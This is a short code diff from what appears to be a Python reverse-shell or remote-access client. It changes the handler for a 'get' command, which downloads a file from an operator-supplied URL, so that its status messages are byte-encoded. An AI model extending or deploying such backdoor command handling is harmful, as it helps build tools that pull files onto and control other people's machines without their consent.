@@ -67,10 +67,10 @@ def shell():
 		elif command[:3] == "get":
 			try:
 				downlaod(command[4:])
-				relibale_send("send + Donwloaded file from sepeicifed url")
+				relibale_send("send + Donwloaded file from sepeicifed url".encode('utf-8'))
 			except Exception as e:
 				print(e)
-				relibale_send("failed to dowload")
+				relibale_send("failed to dowload".encode('utf-8'))
 
 
 		
